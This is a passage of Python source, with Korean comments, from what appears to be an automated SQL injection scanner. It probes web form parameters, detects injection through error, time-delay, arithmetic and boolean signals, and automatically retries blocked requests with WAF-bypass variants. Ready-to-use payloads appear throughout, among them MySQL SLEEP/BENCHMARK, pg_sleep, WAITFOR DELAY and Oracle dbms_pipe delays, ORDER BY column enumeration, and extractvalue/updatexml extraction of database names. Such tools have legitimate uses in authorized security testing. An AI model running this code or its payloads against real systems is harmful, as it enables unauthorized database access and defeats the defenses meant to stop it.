                status, body, elapsed = self._send(surface, {**base_fields, surface.param: variant})
                if status is not None:
                    if not self._is_refused(surface, variant, status, body):
                        if not quiet:
                            print(f"    [Evade] {label}: {cached_name} 우회 성공(캐시)")
                        waf_evasions.append(f"{label}: {cached_name} 우회 성공(캐시) → \"{variant}\"")
                        return status, body, elapsed, variant
                tried_and_failed = cached_name

        # 이 shape의 캐시가 아직 비어있으면(이 필드에서 이 shape로는 처음 차단), scanner.py가
        # hidden_param 발견 당시 확인해둔 우회 기법이 있는지 본다 — 당시 페이로드는 이 shape와 구조가
        # 다를 수 있어 확실치 않지만 요청 1개로 시도할 가치는 있다. 성공하면 이 shape 캐시에도 등록하고,
        # 실패하면 skip에 넣어 전체 탐색에서 중복만 피한다(캐시가 빈 1회성 시도).
        if not cached_name:
            discovery_name = self._discovery_evasion_hint.get((surface.url, surface.param))
            if discovery_name and discovery_name != tried_and_failed:
                variant = apply_named_evasion(discovery_name, payload)
                if variant != payload:
                    status, body, elapsed = self._send(surface, {**base_fields, surface.param: variant})
                    if status is not None:
                        if not self._is_refused(surface, variant, status, body):
                            if not quiet:
                                print(f"    [Evade] {label}: {discovery_name} 우회 성공(발견 당시 기법)")
                            waf_evasions.append(f"{label}: {discovery_name} 우회 성공(발견 당시 기법) → \"{variant}\"")
                            self._evasion_cache[key] = discovery_name
                            return status, body, elapsed, variant
                    tried_and_failed = discovery_name

        result = try_evade(
            lambda variant: self._send(surface, {**base_fields, surface.param: variant}),
            payload, label, waf_hits, waf_evasions, dialect=dialect,
            skip={tried_and_failed} if tried_and_failed else None, quiet=quiet,
            is_banned=lambda v: self._banned_in(surface, v) is not None,
        )
        if result is None:
            return None
        status, body, elapsed, variant, name = result
        self._evasion_cache[key] = name
        return status, body, elapsed, variant

    def _send_evading(self, surface, base_fields, payload: str, label: str,
                       waf_hits: list, waf_evasions: list, timeout: int | None = None,
                       dialect: str | None = None, quiet: bool = False):
        """WAF 인지 전송 — 차단되면 자동으로 우회를 시도한다.

        모든 probe/공격벡터 코드가 raw _send() 대신 이걸 쓰면 WAF 감지·우회·기록이 한 곳에서
        일관되게 처리된다.

        quiet=True면 우회 성공/실패의 [Evade] 개별 로그를 안 찍는다 — 기록은 남으니 나중에 조회
        가능하다. boolean 배치처럼 같은 요청을 짧은 시간에 여럿 보낼 때, 호출부가 한 줄로 요약해
        찍고 싶을 때 쓴다.

        반환: (status, body, elapsed, 실제 사용된 payload, 우회 여부). 완전 실패면 (None, '', 0.0, payload, False).
        """
        status, body, elapsed = self._send(surface, {**base_fields, surface.param: payload}, timeout=timeout)
        if status is None:
            return None, '', 0.0, payload, False

        # 밴(recon 학습)과 WAF를 한 기준으로 통합한 거부 판정 — 밴 토큰이거나 벤더 WAF일 때만
        # 거부로 본다(_is_refused 참고).
        if not self._is_refused(surface, payload, status, body):
            return status, body, elapsed, payload, False
        evaded = self._try_evade(surface, base_fields, payload, label, waf_hits, waf_evasions,
                                  dialect=dialect, quiet=quiet)
        if evaded is None:
            return None, '', 0.0, payload, False
        status, body, elapsed, used_payload = evaded
        return status, body, elapsed, used_payload, True

    # ── 요청 전송 ────────────────────────────────────────────────────────────

    # ── 1. Quote probe ───────────────────────────────────────────────────────

    def _probe_quote(self, surface, base_fields, baseline_status, baseline_body, quote_char, waf_hits: list, waf_evasions: list,
                      quote_signal: dict) -> dict | None:
        status, body, _, used_payload, waf_evaded = self._send_evading(
            surface, base_fields, quote_char, 'quote', waf_hits, waf_evasions,
        )
        if status is None:
            # quote_char 단독조차 우회 전부(단일 7종+조합) 실패 — 이후 quote_char를 담은
            # boolean/error-time 페이로드도 결과가 뻔하니 미리 알려서 스킵하게 한다.
            quote_signal['hopeless'] = True
            return None

        detected_db   = detect_db_from_error(body)
        error_in_body = detected_db is not None
        status_error  = status == 500 and baseline_status != 500
        print(f"    [Quote] quote=\"{used_payload}\" baseline={baseline_status} status={status} "
              f"error_in_body={error_in_body} detected={error_in_body or status_error}")

        if error_in_body or status_error:
            return {
                'type':            ('Error-based SQL Injection (Quote Probe)' if error_in_body
                                     else 'SQL Injection 의심 (미확정)'),
                'detected_db':     detected_db or 'Unknown',
                'payload':         used_payload,
                'baseline_status': baseline_status,
                'attack_status':   status,
                'evidence_kind':   'body' if error_in_body else 'status',
                'error_snippet':   extract_error_snippet(body) if error_in_body else None,
                'waf_evaded':      waf_evaded,
            }
        return None

    # ── 2. Arithmetic probe (숫자형 전용, WAF 우회) ──────────────────────────

    def _probe_arithmetic(self, surface, base_fields, baseline_body, original_value) -> dict | None:
        n = int(original_value)
        base_len = len(baseline_body)
        lens = {}
        for label, val in (('eq', f"{n + 1}-1"), ('neq', str(n + 1))):
            data = {**base_fields, surface.param: val}
            status, body, _ = self._send(surface, data)
            lens[label] = len(body) if status is not None else base_len

        eq_match    = abs(lens['eq'] - base_len) <= 10
        neq_differs = abs(lens['neq'] - base_len) > 30
        print(f"    [Arith] base={base_len} eq={lens['eq']} neq={lens['neq']} "
              f"detected={eq_match and neq_differs}")

        if eq_match and neq_differs:
            return {
                'type':             'Arithmetic-based SQL Injection',
                'detected_db':      'Unknown',
                'payload':          f"{n + 1}-1",
                'baseline_len':     base_len,
                'eq_response_len':  lens['eq'],
                'neq_response_len': lens['neq'],
            }
        return None

    def _probe_hidden_syntax_break(self, surface, base_fields, waf_hits: list, waf_evasions: list) -> dict | None:
        """hidden_param(퍼징으로 발견돼 크롤링 때 실제 값을 본 적 없는 필드) 전용 — _probe_arithmetic의
        원본 값 비교 방식은 원본 값을 모르니 못 쓴다(_base_fields가 채우는 건 실제 원본이 아니라
        고정 문자열 test).

        긍정 등가(A와 B가 산술적으로 같으니 응답도 같다)는 약한 증거다 — 파라미터가 무시되거나
        문자열로만 처리돼도 우연히 비슷한 응답이 날 수 있다. 대신 괄호 짝의 문법 비대칭을 쓴다 —
        짝이 맞으면 정상, 깨면 에러, 다시 맞추면 정상이라는 재현 가능한 패턴은 괄호를 문법 단위로
        해석하는 파서(=SQL 엔진)가 있을 때만 나온다. 앱단이 숫자만 허용하는 검증을 하면 균형/불균형
        값이 똑같이 튕겨 이 패턴이 안 나오고, int() 캐스팅도 괄호를 특별 취급할 이유가 없어 마찬가지다
        — 즉 이 판정 자체가 숫자 검증이나 파라미터 무시 같은 오탐 원인을 걸러낸다.

        base=9, bal1=(9), bal2=((9))는 균형이라 baseline과 비슷해야 하고, broken1=9), broken2=(9는
        불균형이라 baseline과 달라야 한다 — 이 두 조건이 동시에 성립할 때만 숫자형 SQL 파싱으로 1차
        판정한다. 노이즈 기준은 페이지 자체의 요청별 흔들림을 재서 동적으로 잡는다.

        1차 판정만으로 확정하지 않고, broken1을 한 번 더 보내 같은 결과가 재현될 때만 최종 확정한다 —
        우연한 노이즈로 인한 오탐을 배제하는 재현성 체크다(_probe_boolean의 재검증과 같은 원칙).
        """
        noise_texts = []
        for _ in range(2):
            status, body, _ = self._send(surface, {**base_fields, surface.param: 'A' * 10})
            noise_texts.append(visible_text(body) if status is not None else '')
        page_noise = diff_score(noise_texts[0], noise_texts[1])
        # boolean/blind/ORDER BY와 달리 바닥값을 5가 아니라 1로 낮게 잡는다 — 이 probe는 hidden_param
        # 전용이라, 숨겨진 파라미터에 값을 넣었더니 반응이 달라졌다는 것 자체가 그 파라미터가 실제로
        # 쓰인다는 강한 사전 신호다(존재조차 몰랐던 필드니까). 응답 전체가 몇 글자뿐인 페이지에선 진짜
        # SQL 에러가 나도 diff가 1~4에 그칠 수 있어, 바닥값 5는 이런 짧은 응답을 통째로 못 잡는다.
        noise_threshold = max(page_noise * 2, 1)

        values = {'base': '9', 'bal1': '(9)', 'bal2': '((9))', 'broken1': '9)', 'broken2': '(9'}
        texts = {}
        for label, val in values.items():
            status, body, _, _, _ = self._send_evading(
                surface, base_fields, val, f'hidden-syntax({label})', waf_hits, waf_evasions,
            )
            texts[label] = visible_text(body) if status is not None else None
        if any(t is None for t in texts.values()):
            print(f"    [Syntax] hidden 필드 괄호 짝 판별 실패 — 요청 실패 또는 WAF 우회 전부 실패")
            return None

        diffs = {label: diff_score(texts['base'], texts[label])
                 for label in ('bal1', 'bal2', 'broken1', 'broken2')}
        # balanced_ok가 <=(이하)라 threshold와 같은 diff도 정상으로 받는 것과 대칭을 맞추려면
        # broken_signal도 >=(이상)이어야 한다 — diff가 정확히 threshold와 같은 경계 케이스를 신호
        # 없음으로 놓치지 않기 위해서다.
        balanced_ok   = diffs['bal1'] <= noise_threshold and diffs['bal2'] <= noise_threshold
        broken_signal = diffs['broken1'] >= noise_threshold and diffs['broken2'] >= noise_threshold
        print(f"    [Syntax] hidden 필드 괄호 짝 판별: noise={page_noise} threshold={noise_threshold} "
              f"diffs={diffs} → balanced_ok={balanced_ok} broken_signal={broken_signal}")
        if not (balanced_ok and broken_signal):
            return None

        status, retry_body, _, _, _ = self._send_evading(
            surface, base_fields, values['broken1'], 'hidden-syntax(broken1-verify)', waf_hits, waf_evasions,
        )
        if status is None:
            print(f"    [Syntax] 재현성 확인 요청 실패 — 신뢰 불가")
            return None
        retry_diff = diff_score(texts['base'], visible_text(retry_body))
        reproduced = retry_diff >= noise_threshold  # 1차 판정과 같은 기준(>=)으로 맞춤
        print(f"    [Syntax] 재현성 확인: broken1 재전송 diff={retry_diff} → "
              f"{'재현됨(확정)' if reproduced else '재현 안 됨(오탐 의심), 판별 취소'}")
        if not reproduced:
            return None

        return {
            'type':             'Arithmetic-based SQL Injection (Syntax Break)',
            'detected_db':      'Unknown',
            'payload':          values['broken1'],
            'noise_threshold':  noise_threshold,
            'balanced_diffs':   {k: diffs[k] for k in ('bal1', 'bal2')},
            'broken_diffs':     {k: diffs[k] for k in ('broken1', 'broken2')},
            'retry_diff':       retry_diff,
        }

    def _probe_numeric_comment(self, surface, base_fields, injection_prefix: str, vuln_entry: dict,
                                waf_hits: list, waf_evasions: list) -> tuple[str, int | None, str | None]:
        """숫자형/산술 경로로 확정된 필드에서 이후 열거 페이로드에 쓸 comment를 정하고, 동시에 진짜
        정상 기준 응답도 확보해 돌려준다.

        두 확정 방식 다 comment 없이 성공했다 — 인젝션 지점 뒤에 원래 아무것도 안 남는다는 뜻이다.
        이를 이용해 SQL_DIALECTS의 version_fn(순수 표현식이라 comment 불필요)을 값 자리에 그대로 꽂아
        dialect를 판별한다 — 방언이 맞으면 함수가 정상 실행돼 정상 기준과 비슷하게, 틀리면 없는 함수라
        에러가 나 에러 기준과 비슷하게 나온다(_bool_oracle과 같은 더 가까운 쪽 판정).

        판별에 성공하면 comment가 필요 없다는 것도 증명된 셈이라 빈 문자열을 쓰고, detected_db도 채워
        _resolve_dialect가 재프로빙 없이 재사용하게 한다. 실패하면(기준 응답이 안 갈리거나 모든 방언이
        에러 쪽) 안전한 기본값(--, 여러 방언 공통)으로 폴백한다.

        여기서 확보하는 정상 기준 응답(injection_prefix 단독 전송 결과)은 run()이 _go_enumerate의
        baseline으로도 재사용한다 — 처음 캡처한 baseline_body는 원본 값을 모르는 hidden 필드라
        placeholder(test)로 받은 건데, 숫자형 컬럼에 따옴표 없이 꽂히는 필드에선 test가 존재하지 않는
        컬럼 참조로 파싱돼 그 자체가 에러 응답일 수 있다. 그러면 판정이 통째로 뒤집혀서(정상 응답이
        baseline과 달라 깨졌다고, 깨진 응답이 baseline과 같아 정상이라고 오판) injection_prefix 단독
        응답을 새 baseline으로 쓴다.
        """
        ref_ok_status, ref_ok_body, _, _, _ = self._send_evading(
            surface, base_fields, injection_prefix, 'enum(dialect-ref-ok)', waf_hits, waf_evasions,
        )
        ref_err_status, ref_err_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix})", 'enum(dialect-ref-error)', waf_hits, waf_evasions,
        )
        if ref_ok_status is None or ref_err_status is None:
            print(f"    [Enum] dialect 판별용 기준 응답 확보 실패 — comment 기본값('-- ')으로 폴백, "
                  f"baseline도 기존 것 유지")
            return '-- ', ref_ok_status, ref_ok_body
        ref_ok_text, ref_err_text = visible_text(ref_ok_body), visible_text(ref_err_body)
        if diff_score(ref_ok_text, ref_err_text) < 1:
            print(f"    [Enum] 정상/에러 기준 응답이 구분 안 됨 — dialect 판별 불가, comment 기본값('-- ')으로 폴백")
            return '-- ', ref_ok_status, ref_ok_body

        for dialect in DIALECT_PROBE_ORDER:
            version_fn = SQL_DIALECTS[dialect]['version_fn']
            status, body, _, _, _ = self._send_evading(
                surface, base_fields, version_fn, f'enum(dialect-probe:{dialect})', waf_hits, waf_evasions,
            )
            if status is None:
                continue
            text = visible_text(body)
            looks_ok = diff_score(text, ref_ok_text) <= diff_score(text, ref_err_text)
            print(f"    [Enum] dialect 후보={dialect} payload=\"{version_fn}\" → "
                  f"{'정상(일치 가능성)' if looks_ok else '에러(불일치)'}")
            if looks_ok:
                vuln_entry['detected_db'] = dialect
                print(f"    [Enum] dialect 확정: {dialect} — comment 불필요(인젝션 지점 뒤에 "
                      f"남는 게 없음으로 이미 확인됨), comment=''")
                return '', ref_ok_status, ref_ok_body

        print(f"    [Enum] dialect 판별 실패(어느 방언도 안 맞음) — comment 기본값('-- ')으로 폴백")
        return '-- ', ref_ok_status, ref_ok_body

    # ── 3. Error/Time 순차 체인 (DB별) ───────────────────────────────────────

    @staticmethod
    def _db_payloads(quote_char: str) -> list[tuple[str, str]]:
        q = quote_char
        return [
            # SLEEP/BENCHMARK를 OR/AND로 그냥 붙이거나 (SELECT SLEEP(5)) 같은 맨 스칼라 서브쿼리로
            # 넣으면 WHERE가 스캔하는 행마다 반복 평가돼 지연이 행 수만큼 곱해진다(수 배~N배로 타임아웃
            # 위험). 그래서 파생 테이블 서브쿼리 (SELECT ...)x로 감싸 옵티마이저가 한 번만 materialize하게 한다.
            #
            # 동시에 무행(side-effect-free)이어야 한다 — 바깥을 SELECT 0으로 하면 서브쿼리 값이 0이라
            # 행을 반환하지 않는다. 로그인 폼 WHERE에 행이 반환되면 앱이 로그인 성공 처리나 리셋/잠금/
            # 로깅 같은 부작용을 낼 수 있어(지연만 목적인데), SLEEP/BENCHMARK는 값을 SELECT 0으로 버려
            # 무행으로 만든다.
            ('MySQL_OR',   f"{q} OR (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
            ('MySQL_AND',  f"{q} AND (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
            # SLEEP이 밴리스트에 걸려 위 둘 다 실패했을 때만 순서상 자연스럽게 시도되는 폴백.
            # BENCHMARK는 SLEEP과 문법이 안 겹치는 MySQL 전용 CPU 반복 함수라 SLEEP 금지어 필터를
            # 우회한다. 다만 걸리는 시간이 서버 CPU/부하에 좌우돼 SLEEP보다 불안정하므로, SLEEP이
            # 통하면 항상 우선하고 이건 최후 수단으로만 쓴다. 여기도 같은 이유로 파생 테이블(run-once)
            # + SELECT 0(무행).
            ('MySQL_OR_BENCHMARK',  f"{q} OR (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
            ('MySQL_AND_BENCHMARK', f"{q} AND (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
            ('PostgreSQL', f"{q}; SELECT pg_sleep(5) --"),
            # WAITFOR DELAY의 시간 리터럴, dbms_pipe의 채널명은 T-SQL/PL-SQL 자체 문법이라
            # breaking 문자와 무관하게 항상 홑따옴표를 쓴다.
            ('MSSQL',      f"{q}; WAITFOR DELAY '0:0:5' --"),
            ('Oracle',     f"{q} AND 1=dbms_pipe.receive_message('RDS', 5) --"),
        ]

    def _probe_error_time(self, surface, base_fields, baseline_status, baseline_elapsed, quote_char, waf_hits: list, waf_evasions: list,
                           quote_signal: dict, known_dialect: str | None = None) -> dict | None:
        # status만 바뀌는 약한 신호를 만나도 즉시 확정하지 않고, 남은 DB 페이로드에서
        # 본문 증거나 time-based 확정을 더 찾아본다 — 끝까지 없으면 이걸 최후 수단으로 반환.
        fallback = None

        # recon이 에러 시그니처로 이미 DB를 확인해뒀으면(surface.extra['detected_db']) 그 DB 계열
        # 페이로드만 시도한다 — 안 그러면 아는 걸 무시하고 여러 DB를 매번 blind로 다시 찔러본다.
        # db_name이 MySQL_OR/MySQL_AND처럼 같은 DB의 여러 구조 변형일 수 있어, 이름이 known_dialect로
        # 시작하는 항목을 전부 남긴다(한 구조만 쓰면 그게 우연히 안 통할 때 확정을 놓친다). known_dialect가
        # 없거나 매칭되는 항목이 없으면(예: SQLite — 목록에 항목 자체가 없음) 기존처럼 전체를 순회한다.
        db_payloads = self._db_payloads(quote_char)
        if known_dialect:
            filtered = [(name, p) for name, p in db_payloads if name.startswith(known_dialect)]
            if filtered:
                skipped = len(db_payloads) - len(filtered)
                print(f"    [ET] 이미 확인된 DB({known_dialect}) 페이로드만 시도 — 나머지 {skipped}개 스킵")
                db_payloads = filtered

        # boolean과 같은 원칙 — quote_signal['hopeless']가 이미 True(quote probe/boolean 둘 중
        # 하나라도 실패 확인)여도, error/time은 자기 구조(SLEEP 서브쿼리 등)로 첫 quote 포함
        # 페이로드를 반드시 한 번 직접 시도해본다. '그것도' 실패했을 때만(기존 증거 + 이 단계
        # 자체 확인, 두 증거가 겹칠 때만) 이후 quote 포함 DB 페이로드를 스킵한다.
        time_quote_hopeless = False
        for db_name, payload in db_payloads:
            contains_quote = quote_char in payload
            if contains_quote and time_quote_hopeless:
                print(f"    [ET] db={db_name} — \"{quote_char}\" 우회 불가 이 단계에서 이미 확인됨, 스킵")
                continue

            status, body, elapsed, used_payload, waf_evaded = self._send_evading(
                surface, base_fields, payload, f'error/time({db_name})', waf_hits, waf_evasions,
                timeout=self.TIME_TIMEOUT,
            )
            if status is None:
                print(f"    [ET] db={db_name} 요청 실패/타임아웃 또는 WAF 우회 실패 → 다음 DB로")
                if contains_quote and not time_quote_hopeless and quote_signal['hopeless']:
                    time_quote_hopeless = True
                    print(f"    [ET] \"{quote_char}\" 포함 첫 페이로드 우회 실패(quote probe/boolean도 "
                          f"실패) — 이후 이 단계의 \"{quote_char}\" 포함 DB 페이로드는 스킵")
                continue

            detected_db    = detect_db_from_error(body)
            error_in_body  = detected_db is not None
            status_error   = status == 500 and baseline_status != 500
            time_detected  = elapsed >= (baseline_elapsed + 4.5)
            print(f"    [ET] db={db_name} status={status} error={error_in_body} "
                  f"time={elapsed:.2f}s(base={baseline_elapsed:.2f}s)")

            if error_in_body:
                return {
                    'type':            'Error-based SQL Injection',
                    'detected_db':     detected_db,
                    'payload':         used_payload,
                    'baseline_status': baseline_status,
                    'attack_status':   status,
                    'evidence_kind':   'body',
                    'error_snippet':   extract_error_snippet(body),
                    'waf_evaded':      waf_evaded,
                }
            elif status_error and fallback is None:
                fallback = {
                    'type':            'SQL Injection 의심 (미확정)',
                    'detected_db':     db_name,
                    'payload':         used_payload,
                    'baseline_status': baseline_status,
                    'attack_status':   status,
                    'evidence_kind':   'status',
                    'error_snippet':   None,
                    'waf_evaded':      waf_evaded,
                }

            if time_detected:
                # 1차 교차검증 — 페이로드 없는 baseline 재요청도 느리면 서버 전역 렉으로
                # 보고 다음 DB로 넘어간다.
                v_status, _, v_elapsed = self._send(surface, dict(base_fields), timeout=self.TIMEOUT)
                if v_status is None or v_elapsed >= baseline_elapsed + 2.0:
                    print(f"    [ET] db={db_name} 검증 요청도 느림 → 서버 렉, 다음 DB로")
                    continue

                # 2차 재현성 확인 — baseline이 빨랐다는 것만으로는 이 페이로드가 원인이란 증거가
                # 안 된다. 취약점과 무관한 필드에서도 인프라/네트워크의 단발성 지연이 우연히 한 번
                # 걸릴 수 있고, 그 직후 baseline 재요청은 원인이 뭐였든 자연히 빨라져 1차 검증만으론
                # 우연과 진짜 SQLi를 못 가린다. 같은 공격 페이로드를 한 번 더 보내 지연이 재현될 때만 확정한다.
                r_status, _, r_elapsed, _, _ = self._send_evading(
                    surface, base_fields, payload, f'error/time({db_name},verify)', waf_hits, waf_evasions,
                    timeout=self.TIME_TIMEOUT,
                )
                reproduced = r_status is not None and r_elapsed >= (baseline_elapsed + 4.5)
                print(f"    [ET] db={db_name} 재현성 확인: {r_elapsed if r_status is not None else '요청실패'} → "
                      f"{'재현됨(확정)' if reproduced else '재현 안 됨(우연한 지연 의심), 판정 취소'}")
                if reproduced:
                    return {
                        'type':             'Time-based SQL Injection',
                        'detected_db':      db_name,
                        'payload':          used_payload,
                        'baseline_duration': round(baseline_elapsed, 2),
                        'attack_time':      round(elapsed, 2),
                        'verify_time':      round(v_elapsed, 2),
                        'reproduced_time':  round(r_elapsed, 2),
                        'waf_evaded':       waf_evaded,
                    }

        return fallback

    # ── 4. Noise 측정 → Boolean → Fingerprint ────────────────────────────────

    def _probe_boolean(self, surface, base_fields, original_value, quote_char, waf_hits: list,
                        waf_evasions: list, quote_signal: dict) -> dict | None:
        """스캐폴드(따옴표·연결어·주석으로 고정된 페이로드 껍데기)마다 등가 클러스터를 돌려, 참/거짓이
        리터럴이 아니라 논리 진리값에 따라 갈리는지로 boolean SQLi를 확정한다.

        절대 노이즈 바닥은 안 쓴다 — 같은 조건(참 변형끼리)의 흔들림을 그 자리에서 재(jitter), 참/거짓
        간격이 그 흔들림보다 확실히 클 때만(_separable) 신호로 본다. 동적 페이지면 흔들림이 커져 자동으로
        더 큰 간격을 요구한다.

        스캐폴드 순서는 footprint(타입/따옴표 문맥)로 매긴다 — 유력한 것부터 돌려 첫 확정에서 멈춘다.
        단 순서일 뿐 제외는 안 한다(따옴표 하나는 숫자형도 깨뜨려 타입 신호가 확정 증거가 못 됨).

        단계(스캐폴드당):
          Layer 1 — 참2 + 거짓1 (상대 선-게이트): jitter=참끼리 흔들림, signal=참↔거짓 최소 diff.
                    signal이 흔들림을 못 넘으면(채널 없음/흔들림 수준) 다음 스캐폴드로.
          Layer 2 — 참1 + 거짓2 더 보내 3:3 클러스터 완성 → 진리값대로 뭉치면 확정."""
        numeric = str(original_value).isdigit()

        def _pref(style: str) -> int:
            # footprint: 숫자형이면 순수 숫자 스타일을, 아니면 문자열 스타일을 앞으로.
            if numeric:
                return 0 if style == 'num' else 1
            return 0 if style.startswith('str') else 1

        templates = sorted(self._build_boolean_payloads(original_value, quote_char),
                           key=lambda t: _pref(t[3]))
        variants = self._bool_cond_variants(quote_char)

        # quote_signal['hopeless']는 quote probe가 따옴표 하나로 우회 전부 실패했음을 뜻하는 참고값이다.
        # 그것만으로 예단하진 않고, 따옴표를 포함한 스캐폴드가 실제로 또 우회 전부 실패했을 때만(두 증거가
        # 겹칠 때만) 이후 따옴표 포함 스캐폴드를 스킵한다.
        quote_hopeless = False
        tried = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            for _, _, build, style in templates:
                true_conds, false_conds = variants[style]
                scaffold_has_quote = bool(quote_char) and quote_char in build(true_conds[0])
                if scaffold_has_quote and quote_hopeless:
                    continue

                # Layer 1 — 참2 + 거짓1 동시 전송. quiet=True: 병렬 우회 로그가 뒤섞이지 않게.
                l1_payloads = [build(true_conds[0]), build(true_conds[1]), build(false_conds[0])]
                l1 = [r.result() for r in [
                    pool.submit(self._send_evading, surface, base_fields, p,
                                'boolean(scan)', waf_hits, waf_evasions, quiet=True)
                    for p in l1_payloads
                ]]
                if any(r[0] is None for r in l1):
                    # 우회까지 전부 실패. 따옴표 포함 스캐폴드이고 quote probe도 실패했다면 이후 스킵.
                    if scaffold_has_quote and not quote_hopeless and quote_signal['hopeless']:
                        quote_hopeless = True
                        print(f"    [Bool] \"{quote_char}\" 포함 스캐폴드 우회 실패(quote probe도 실패) — "
                              f"이후 따옴표 포함 스캐폴드는 스킵")
                    continue
                tried += 1
                t0, t1, f0 = (visible_text(r[1]) for r in l1)
                jitter = diff_score(t0, t1)                       # 같은 조건(참)끼리 흔들림
                signal = min(diff_score(t0, f0), diff_score(t1, f0))  # 참↔거짓 간격
                if not self._separable(signal, jitter):
                    continue  # 채널 없음 또는 흔들림 수준 — 다음 스캐폴드

                print(f"    [Bool] 후보 스캐폴드: \"{l1[0][3]}\" (참↔거짓 간격={signal}, 참끼리 흔들림={jitter})")

                # Layer 2 — 클러스터 완성 후 진리값 뭉침 판정.
                vuln_entry = self._verify_boolean_cluster(
                    surface, base_fields, build, true_conds, false_conds,
                    [t0, t1], [f0], l1[0][3], l1[2][3],
                    waf_evaded=any(r[4] for r in l1), waf_hits=waf_hits, waf_evasions=waf_evasions, pool=pool,
                )
                if vuln_entry is not None:
                    return vuln_entry

        print(f"    [Bool] 스캐폴드 {tried}개 시도 — 진리값대로 갈리는 신호 없음, boolean 탐지 실패")
        return None

    def _verify_boolean_cluster(self, surface, base_fields, build, true_conds, false_conds,
                                 true_texts: list, false_texts: list, true_payload: str, false_payload: str,
                                 *, waf_evaded: bool, waf_hits: list, waf_evasions: list, pool) -> dict | None:
        """등가 클러스터로 참/거짓 차이가 논리 진리값 때문인지 특정 문자열(필터/상태) 때문인지를 가른다.

        핵심 원리(논리적 등가 불변성): 진짜 boolean SQLi라면 1=1·2=2·9=9가 전부 같은 참 응답으로,
        1=2·3=4·9=8이 전부 같은 거짓 응답으로 뭉친다. 필터/콘텐츠 차이는 특정 문자열에만 반응하므로
        리터럴을 바꾸면 이 뭉침이 깨진다. stateful 앱도 클러스터 응집이 깨져 자연히 걸러진다.

        Layer 1에서 받은 참2(true_texts)·거짓1(false_texts)을 재사용하고, 참1·거짓2를 더 보내 3:3을
        채운다. 판정은 절대 임계가 아니라 상대값 — 뭉치 내부 흔들림(intra_spread)보다 뭉치 사이
        간격(separation)이 2배 넘게 크면 확정(_separable). 변형 요청이 하나라도 실패하면 보류한다."""
        t_futures = [pool.submit(self._send_evading, surface, base_fields, build(c),
                                 'boolean(cluster-true)', waf_hits, waf_evasions) for c in true_conds[2:]]
        f_futures = [pool.submit(self._send_evading, surface, base_fields, build(c),
                                 'boolean(cluster-false)', waf_hits, waf_evasions) for c in false_conds[1:]]
        for futures, bucket, side in ((t_futures, true_texts, '참'), (f_futures, false_texts, '거짓')):
            for fut in futures:
                st, body, _, _, _ = fut.result()
                if st is None:
                    print(f"    [Bool] 클러스터 {side} 변형 요청 불가(우회 실패 등) — 확정 보류")
                    return None
                bucket.append(visible_text(body))

        intra_spread = max(
            [diff_score(a, b) for texts in (true_texts, false_texts)
             for i, a in enumerate(texts) for b in texts[i + 1:]] or [0]
        )
        separation = min(diff_score(t, f) for t in true_texts for f in false_texts)
        ok = self._separable(separation, intra_spread)
        print(f"    [Bool] 등가 클러스터: 뭉치 내부 흔들림={intra_spread} 뭉치 사이 간격={separation} → "
              f"{'확정' if ok else '오탐 의심(리터럴 바꾸니 뭉침이 깨짐), 다음 스캐폴드'}")
        if not ok:
            return None
        # 방언 판별은 여기서 안 한다 — _go_enumerate가 UNION 추출 직전에 확정된 오라클로 판별한다.
        return {
            'type':               'Boolean-based SQL Injection',
            'detected_db':        'Unknown',
            'true_payload':       true_payload,
            'false_payload':      false_payload,
            'true_response_len':  len(true_texts[0]),
            'false_response_len': len(false_texts[0]),
            'intra_spread':       intra_spread,
            'separation':         separation,
            'waf_evaded':         waf_evaded,
        }

    # ── 5. 공격벡터 확인: enumerate → union reflect → union extract ─────────

    def _go_enumerate(self, surface, base_fields, baseline_body, baseline_status, vuln_entry: dict,
                       injection_prefix: str, comment: str, waf_hits: list, waf_evasions: list,
                       stateful: bool = False) -> None:
        baseline_text = visible_text(baseline_body)

        # 본문 길이 차이(len)만 보면, 이 필드처럼 본문이 숨겨져 있고(evidence_kind='status')
        # 상태코드만 바뀌는 blind 사이트에서는 컬럼 수 경계를 절대 못 찾는다 — 상태코드 변화도
        # 같이 추적해서, 둘 중 하나라도 baseline에서 벗어나면 그 지점을 컬럼 수 경계로 본다.
        # 컬럼 수를 넘기면 에러로 응답이 질적으로 달라지는데, 유효한 ORDER BY끼리는 행 재정렬 정도의
        # 흔들림만 보인다. 그래서 절대 노이즈 대신, 유효 응답(ORDER BY 1)을 기준으로 그 흔들림보다
        # 확실히 벗어나는 지점을 경계로 본다(_separable). 흔들림 바닥은 ORDER BY 1↔2 차이로 잡는다.
        order_rows = {}  # n -> (status, text|None, used_payload)
        for n in range(1, self.MAX_UNION_COLS + 1):
            status, body, _, used_payload, _ = self._send_evading(
                surface, base_fields, f"{injection_prefix} ORDER BY {n} {comment}", f'enum(ORDER BY {n})', waf_hits, waf_evasions,
            )
            order_rows[n] = (status, visible_text(body) if status is not None else None, used_payload)
            if status is None and n == 1:
                # ORDER BY 1이 우회 7종을 다 쓰고도 완전히 막혔다면, 2~10도 숫자만 다를 뿐
                # 완전히 같은 모양(공백+키워드)의 페이로드라 막히는 이유가 똑같다 — 컬럼 수와
                # 무관한 구조적 차단이니 나머지를 다 돌려봐야 결과가 달라질 리 없다.
                print(f"    [Enum] ORDER BY 1부터 완전 차단됨 — 컬럼 수와 무관한 구조적 차단으로 보고 "
                      f"나머지 {self.MAX_UNION_COLS - 1}개는 스킵")
                # UNION reflect 등 뒤에 오는 quote_char 포함 probe들이 참고할 수 있게 기록.
                self._quote_signal[(surface.url, surface.param)] = True
                break

        extract_found = {}
        is_error_based = (
            vuln_entry['type'] in ('Error-based SQL Injection (Quote Probe)', 'Error-based SQL Injection')
            and vuln_entry.get('evidence_kind') == 'body'
        )
        if is_error_based: # 본문에 실제 에러 메시지가 노출된 경우에만 extractvalue 계열 시도
            for payload, label in [
                (f"{injection_prefix} AND extractvalue(1,concat(0x7e,database())) # ", 'mysql_extractvalue'),
                (f"{injection_prefix} AND updatexml(1,concat(0x7e,database()),1) # ",  'mysql_updatexml'),
                (f"{injection_prefix} AND 1=cast(version() as int) -- ",                'pg_cast'),
            ]:
                status, body, _, _, _ = self._send_evading(
                    surface, base_fields, payload, f'enum({label})', waf_hits, waf_evasions,
                )
                if status is None:
                    continue
                match = re.search(r'~([^<\s\'"&]{1,64})', body)
                if match:
